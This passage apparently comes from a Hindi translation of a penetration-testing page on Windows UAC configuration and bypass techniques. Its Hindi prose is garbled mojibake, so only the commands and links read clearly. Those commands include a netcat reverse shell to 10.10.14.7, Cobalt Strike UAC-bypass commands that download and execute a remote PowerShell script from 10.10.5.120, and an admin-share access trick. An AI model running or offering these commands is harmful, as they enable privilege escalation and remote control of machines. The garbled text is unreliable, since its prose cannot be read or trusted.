* ‡§Ø‡§¶‡§ø **`3`** `1` ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§π‡•à ‡§≤‡•á‡§ï‡§ø‡§® ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§°‡•á‡§∏‡•ç‡§ï‡§ü‡•â‡§™ ‡§™‡§∞ ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à
* ‡§Ø‡§¶‡§ø **`4`** `2` ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§π‡•à ‡§≤‡•á‡§ï‡§ø‡§® ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§°‡•á‡§∏‡•ç‡§ï‡§ü‡•â‡§™ ‡§™‡§∞ ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à
* ‡§Ø‡§¶‡§ø **`5`** (**‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü**) ‡§Ø‡§π ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï ‡§∏‡•á ‡§™‡•Ç‡§õ‡•á‡§ó‡§æ ‡§ï‡§ø ‡§ï‡•ç‡§Ø‡§æ ‡§µ‡§π ‡§ó‡•à‡§∞ Windows ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•ã ‡§â‡§ö‡•ç‡§ö ‡§Ö‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•Ä ‡§™‡•Å‡§∑‡•ç‡§ü‡§ø ‡§ï‡§∞‡•á‡§Ç

‡§´‡§ø‡§∞, ‡§Ü‡§™‡§ï‡•ã **`LocalAccountTokenFilterPolicy`** ‡§ï‡•á ‡§Æ‡§æ‡§® ‡§ï‡•Ä ‡§¶‡•á‡§ñ‡§≠‡§æ‡§≤ ‡§ï‡§∞‡§®‡•Ä ‡§π‡•ã‡§ó‡•Ä\
‡§Ø‡§¶‡§ø ‡§Æ‡§æ‡§® **`0`** ‡§π‡•à, ‡§§‡•ã ‡§ï‡•á‡§µ‡§≤ **RID 500** ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ (**‡§Ö‡§Ç‡§§‡§∞‡•ç‡§®‡§ø‡§π‡§ø‡§§ ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï**) UAC ‡§ï‡•á ‡§¨‡§ø‡§®‡§æ **‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï ‡§ï‡§æ‡§∞‡•ç‡§Ø** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§î‡§∞ ‡§Ø‡§¶‡§ø ‡§á‡§∏‡§ï‡§æ `1` ‡§π‡•à, **"‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï" ‡§∏‡§Æ‡•Ç‡§π ‡§ï‡•á ‡§∏‡§≠‡•Ä ‡§ñ‡§æ‡§§‡•á** ‡§á‡§∏‡•á ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§î‡§∞, ‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç **`FilterAdministratorToken`** ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡•á ‡§Æ‡§æ‡§® ‡§ï‡•Ä ‡§¶‡•á‡§ñ‡§≠‡§æ‡§≤ ‡§ï‡§∞‡•á‡§Ç\
‡§Ø‡§¶‡§ø **`0`**(‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü), ‡§§‡•ã **‡§Ö‡§Ç‡§§‡§∞‡•ç‡§®‡§ø‡§π‡§ø‡§§ ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï ‡§ñ‡§æ‡§§‡§æ** ‡§¶‡•Ç‡§∞‡§∏‡•ç‡§• ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§® ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§Ø‡§¶‡§ø **`1`** ‡§Ö‡§Ç‡§§‡§∞‡•ç‡§®‡§ø‡§π‡§ø‡§§ ‡§ñ‡§æ‡§§‡§æ ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï **‡§¶‡•Ç‡§∞‡§∏‡•ç‡§• ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§® ‡§ï‡§æ‡§∞‡•ç‡§Ø** ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§ú‡§¨ ‡§§‡§ï `LocalAccountTokenFilterPolicy` ‡§ï‡•ã `1` ‡§™‡§∞ ‡§∏‡•á‡§ü ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à‡•§

#### ‡§∏‡§æ‡§∞‡§æ‡§Ç‡§∂

* ‡§Ø‡§¶‡§ø `EnableLUA=0` ‡§Ø‡§æ **‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à**, **‡§ï‡§ø‡§∏‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≠‡•Ä ‡§ï‡•ã‡§à UAC ‡§®‡§π‡•Ä‡§Ç**
* ‡§Ø‡§¶‡§ø `EnableLua=1` ‡§î‡§∞ **`LocalAccountTokenFilterPolicy=1` , ‡§ï‡§ø‡§∏‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≠‡•Ä ‡§ï‡•ã‡§à UAC ‡§®‡§π‡•Ä‡§Ç**
* ‡§Ø‡§¶‡§ø `EnableLua=1` ‡§î‡§∞ **`LocalAccountTokenFilterPolicy=0` ‡§î‡§∞ `FilterAdministratorToken=0`, RID 500 ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•ã‡§à UAC ‡§®‡§π‡•Ä‡§Ç (‡§Ö‡§Ç‡§§‡§∞‡•ç‡§®‡§ø‡§π‡§ø‡§§ ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï)**
* ‡§Ø‡§¶‡§ø `EnableLua=1` ‡§î‡§∞ **`LocalAccountTokenFilterPolicy=0` ‡§î‡§∞ `FilterAdministratorToken=1`, ‡§∏‡§≠‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è UAC**

‡§á‡§∏ ‡§∏‡§≠‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•ã **metasploit** ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï‡§§‡•ç‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à: `post/windows/gather/win_privs`

‡§Ü‡§™ ‡§Ö‡§™‡§®‡•á ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§ï‡•Ä ‡§ú‡§æ‡§Å‡§ö ‡§≠‡•Ä ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§Ö‡§ñ‡§Ç‡§°‡§§‡§æ ‡§∏‡•ç‡§§‡§∞ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```
net user %username%
whoami /groups | findstr Level
```
## UAC ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏

{% hint style="info" %}
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•á ‡§™‡§æ‡§∏ ‡§™‡•Ä‡§°‡§º‡§ø‡§§ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ó‡•ç‡§∞‡§æ‡§´‡§ø‡§ï‡§≤ ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§π‡•à, ‡§§‡•ã UAC ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§∏‡•Ä‡§ß‡§æ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§ú‡§¨ UAC ‡§™‡•ç‡§∞‡•â‡§Æ‡•ç‡§™‡•ç‡§ü ‡§Ü‡§§‡§æ ‡§π‡•à ‡§§‡•ã ‡§Ü‡§™ ‡§¨‡§∏ "‡§π‡§æ‡§Å" ‡§™‡§∞ ‡§ï‡•ç‡§≤‡§ø‡§ï ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§
{% endhint %}

UAC ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§Æ‡•á‡§Ç ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à: **UAC ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§π‡•à, ‡§Ü‡§™‡§ï‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§Ö‡§ñ‡§Ç‡§°‡§§‡§æ ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠ ‡§Æ‡•á‡§Ç ‡§ö‡§≤ ‡§∞‡§π‡•Ä ‡§π‡•à, ‡§î‡§∞ ‡§Ü‡§™‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï ‡§∏‡§Æ‡•Ç‡§π ‡§Æ‡•á‡§Ç ‡§π‡•à**‡•§

‡§â‡§≤‡•ç‡§≤‡•á‡§ñ‡§®‡•Ä‡§Ø ‡§π‡•à ‡§ï‡§ø **‡§Ø‡§¶‡§ø UAC ‡§∏‡§∞‡•ç‡§µ‡•ã‡§ö‡•ç‡§ö ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§∏‡•ç‡§§‡§∞ ‡§Æ‡•á‡§Ç ‡§π‡•à (‡§π‡§Æ‡•á‡§∂‡§æ) ‡§§‡•ã ‡§á‡§∏‡•á ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡§æ ‡§Ö‡§®‡•ç‡§Ø ‡§∏‡•ç‡§§‡§∞‡•ã‡§Ç (‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü) ‡§Æ‡•á‡§Ç ‡§π‡•ã‡§®‡•á ‡§∏‡•á ‡§ï‡§π‡•Ä‡§Ç ‡§ú‡•ç‡§Ø‡§æ‡§¶‡§æ ‡§ï‡§†‡§ø‡§® ‡§π‡•à**‡•§

### UAC ‡§®‡§ø‡§∑‡•ç‡§ï‡•ç‡§∞‡§ø‡§Ø

‡§Ø‡§¶‡§ø UAC ‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§π‡•Ä ‡§®‡§ø‡§∑‡•ç‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§π‡•à (`ConsentPromptBehaviorAdmin` **`0`** ‡§π‡•à) ‡§§‡•ã ‡§Ü‡§™ **‡§è‡§°‡§Æ‡§ø‡§® ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∞‡§ø‡§µ‡§∞‡•ç‡§∏ ‡§∂‡•à‡§≤ ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç** (‡§â‡§ö‡•ç‡§ö ‡§Ö‡§ñ‡§Ç‡§°‡§§‡§æ ‡§∏‡•ç‡§§‡§∞) ‡§ï‡•Å‡§õ ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC ‡§ü‡•ã‡§ï‡§® ‡§°‡•Å‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§ï‡•á ‡§∏‡§æ‡§• UAC ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **‡§¨‡§π‡•Å‡§§** ‡§¨‡•á‡§∏‡§ø‡§ï UAC "‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏" (‡§™‡•Ç‡§∞‡•Ä ‡§´‡§º‡§æ‡§á‡§≤ ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§è‡§ï‡•ç‡§∏‡•á‡§∏)

‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•á ‡§™‡§æ‡§∏ ‡§è‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§∂‡•à‡§≤ ‡§ú‡•ã ‡§µ‡•ç‡§Ø‡§µ‡§∏‡•ç‡§•‡§æ‡§™‡§ï ‡§∏‡§Æ‡•Ç‡§π ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ **SMB ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á C$** ‡§∏‡§æ‡§ù‡§æ ‡§ï‡•ã ‡§Æ‡§æ‡§â‡§Ç‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç (‡§´‡§º‡§æ‡§á‡§≤ ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ) ‡§è‡§ï ‡§®‡§à ‡§°‡§ø‡§∏‡•ç‡§ï ‡§Æ‡•á‡§Ç ‡§î‡§∞ ‡§Ü‡§™‡§ï‡•ã **‡§´‡§º‡§æ‡§á‡§≤ ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§∏‡§¨ ‡§ï‡•Å‡§õ ‡§è‡§ï‡•ç‡§∏‡•á‡§∏** ‡§Æ‡§ø‡§≤‡•á‡§ó‡§æ (‡§Ø‡§π‡§æ‡§Å ‡§§‡§ï ‡§ï‡§ø ‡§µ‡•ç‡§Ø‡§µ‡§∏‡•ç‡§•‡§æ‡§™‡§ï ‡§π‡•ã‡§Æ ‡§´‡§º‡•ã‡§≤‡•ç‡§°‡§∞ ‡§≠‡•Ä).

{% hint style="warning" %}
**‡§≤‡§ó‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§Ø‡§π ‡§ü‡•ç‡§∞‡§ø‡§ï ‡§Ö‡§¨ ‡§ï‡§æ‡§Æ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞ ‡§∞‡§π‡•Ä ‡§π‡•à**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC ‡§ï‡•ã‡§¨‡§æ‡§≤‡•ç‡§ü ‡§∏‡•ç‡§ü‡•ç‡§∞‡§æ‡§á‡§ï ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏

‡§ï‡•ã‡§¨‡§æ‡§≤‡•ç‡§ü ‡§∏‡•ç‡§ü‡•ç‡§∞‡§æ‡§á‡§ï ‡§§‡§ï‡§®‡•Ä‡§ï‡•á‡§Ç ‡§ï‡•á‡§µ‡§≤ ‡§§‡§≠‡•Ä ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡•á‡§Ç‡§ó‡•Ä ‡§Ö‡§ó‡§∞ UAC ‡§Ö‡§™‡§®‡•á ‡§Ö‡§ß‡§ø‡§ï‡§§‡§Æ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§∏‡•ç‡§§‡§∞ ‡§™‡§∞ ‡§∏‡•á‡§ü ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ‡§î‡§∞ **Metasploit** ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§≠‡•Ä ‡§ï‡§à ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤ ‡§π‡•à‡§Ç ‡§ú‡•ã **UAC** ‡§ï‡•ã **‡§¨‡§æ‡§á‡§™‡§æ‡§∏** ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§Æ‡§¶‡§¶ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç‡•§

### KRBUACBypass

[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) ‡§Æ‡•á‡§Ç ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§î‡§∞ ‡§â‡§™‡§ï‡§∞‡§£‡•§

### UAC ‡§¨‡§æ‡§á‡§™‡§æ‡§∏ ‡§â‡§§‡•ç‡§™‡§æ‡§¶

[**UACME**](https://github.com/hfiref0x/UACME) ‡§ú‡•ã ‡§ï‡§à UAC ‡§¨‡§æ‡§á‡§™‡§æ‡§∏ ‡§â‡§§‡•ç‡§™‡§æ‡§¶‡•ã‡§Ç ‡§ï‡§æ ‡§∏‡§Ç‡§ï‡§≤‡§® ‡§π‡•à‡•§ ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§Ü‡§™‡§ï‡•ã **visual studio ‡§Ø‡§æ msbuild ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á UACME ‡§ï‡•ã ‡§ï‡§Ç‡§™‡§æ‡§á‡§≤ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à**‡•§ ‡§ï‡§Ç‡§™‡§æ‡§á‡§≤‡•á‡§∂‡§® ‡§∏‡•á ‡§ï‡§à executables (‡§ú‡•à‡§∏‡•á `Source\Akagi\outout\x64\Debug\Akagi.exe`) ‡§¨‡§®‡•á‡§Ç‡§ó‡•á, ‡§Ü‡§™‡§ï‡•ã **‡§ú‡§æ‡§®‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™‡§ï‡•ã ‡§ï‡•å‡§® ‡§∏‡§æ ‡§ö‡§æ‡§π‡§ø‡§è**‡•§\
‡§Ü‡§™‡§ï‡•ã **‡§∏‡§æ‡§µ‡§ß‡§æ‡§® ‡§∞‡§π‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è** ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§ï‡•Å‡§õ ‡§¨‡§æ‡§á‡§™‡§æ‡§∏ ‡§Ö‡§®‡•ç‡§Ø ‡§ï‡•Å‡§õ ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ‡•ã‡§Ç ‡§ï‡•ã **‡§™‡•ç‡§∞‡•â‡§Æ‡•ç‡§™‡•ç‡§ü** ‡§ï‡§∞‡•á‡§Ç‡§ó‡•á ‡§ú‡•ã **‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ** ‡§ï‡•ã ‡§Ö‡§≤‡§∞‡•ç‡§ü ‡§ï‡§∞‡•á‡§Ç‡§ó‡•á ‡§ï‡§ø ‡§ï‡•Å‡§õ ‡§π‡•ã ‡§∞‡§π‡§æ ‡§π‡•à‡•§

UACME ‡§Æ‡•á‡§Ç ‡§π‡§∞ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡•á **‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§®‡•á ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§¨‡§ø‡§≤‡•ç‡§° ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£** ‡§π‡•à‡•§ ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•á ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§™‡§∞ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ ‡§°‡§æ‡§≤‡§®‡•á ‡§µ‡§æ‡§≤‡•Ä ‡§ï‡§ø‡§∏‡•Ä ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡•Ä ‡§ñ‡•ã‡§ú ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### ‡§Ö‡§ß‡§ø‡§ï UAC ‡§¨‡§æ‡§á‡§™‡§æ‡§∏

**‡§∏‡§≠‡•Ä** ‡§§‡§ï‡§®‡•Ä‡§ï‡•á‡§Ç ‡§ú‡•ã ‡§Ø‡§π‡§æ‡§Å UAC ‡§ï‡•ã ‡§¨‡§æ‡§á‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡•Ä ‡§ó‡§à ‡§π‡•à‡§Ç **‡§è‡§ï ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§á‡§Ç‡§ü‡§∞‡•à‡§ï‡•ç‡§ü‡§ø‡§µ ‡§∂‡•à‡§≤** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§™‡•Ä‡§°‡§º‡§ø‡§§ ‡§ï‡•á ‡§∏‡§æ‡§• (‡§è‡§ï ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø nc.exe ‡§∂‡•à‡§≤ ‡§ï‡§æ‡§´‡•Ä ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡§Ç) ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à‡•§

‡§Ü‡§™ ‡§è‡§ï **‡§Æ‡•Ä‡§ü‡§∞‡§™‡•ç‡§∞‡•Ä‡§ü‡§∞** ‡§∏‡§§‡•ç‡§∞ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ **Session** ‡§Æ‡§æ‡§® ‡§ï‡•á ‡§∏‡§Æ‡§æ‡§® **1** ‡§π‡•ã‡§®‡•á ‡§µ‡§æ‡§≤‡•á **‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ** ‡§Æ‡•á‡§Ç ‡§Æ‡§æ‡§á‡§ó‡•ç‡§∞‡•á‡§ü ‡§ï‡§∞‡•á‡§Ç:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡•á‡§ó‡§æ)

### GUI ‡§ï‡•á ‡§∏‡§æ‡§• UAC ‡§¨‡§æ‡§á‡§™‡§æ‡§∏

‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•á ‡§™‡§æ‡§∏ **GUI ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§π‡•à ‡§§‡•ã ‡§ú‡§¨ ‡§Ü‡§™‡§ï‡•ã ‡§Ø‡§π ‡§Æ‡§ø‡§≤‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ ‡§¨‡§∏ UAC ‡§™‡•ç‡§∞‡•â‡§Æ‡•ç‡§™‡•ç‡§ü ‡§ï‡•ã ‡§∏‡•ç‡§µ‡•Ä‡§ï‡§æ‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**, ‡§Ü‡§™‡§ï‡•ã ‡§á‡§∏‡§ï‡•Ä ‡§¨‡§æ‡§á‡§™‡§æ‡§∏ ‡§ï‡•Ä ‡§µ‡§æ‡§∏‡•ç‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, GUI ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö‡§®‡•á ‡§∏‡•á ‡§Ü‡§™ UAC ‡§ï‡•ã ‡§¨‡§æ‡§á‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§ó‡§æ‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§, ‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•á ‡§™‡§æ‡§∏ ‡§è‡§ï GUI ‡§∏‡§§‡•ç‡§∞ ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§ï‡•ã‡§à ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§•‡§æ (‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á RDP ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á) ‡§§‡•ã **‡§ï‡•Å‡§õ ‡§â‡§™‡§ï‡§∞‡§£ ‡§µ‡•ç‡§Ø‡§µ‡§∏‡•ç‡§•‡§æ‡§™‡§ï ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ö‡§≤ ‡§∞‡§π‡•á ‡§π‡•ã‡§Ç‡§ó‡•á** ‡§ú‡§π‡§æ‡§Å ‡§∏‡•á ‡§Ü‡§™ **‡§â‡§ö‡•ç‡§ö‡§§‡§Æ ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï** ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç **‡§ï‡•ã‡§à ‡§≠‡•Ä cmd ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç** ‡§¨‡§ø‡§®‡§æ ‡§´‡§ø‡§∞ ‡§∏‡•á UAC ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§™‡•Å‡§®‡§É ‡§™‡•Ç‡§õ‡§æ ‡§ú‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ú‡•à‡§∏‡•á [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)‡•§ ‡§Ø‡§π ‡§•‡•ã‡§°‡§º‡§æ ‡§Ö‡§ß‡§ø‡§ï **‡§õ‡§ø‡§™‡§ï‡§≤‡•Ä** ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

### ‡§∂‡•ã‡§∞‡§ó‡•Å‡§≤ UAC ‡§¨‡§æ‡§á‡§™‡§æ‡§∏

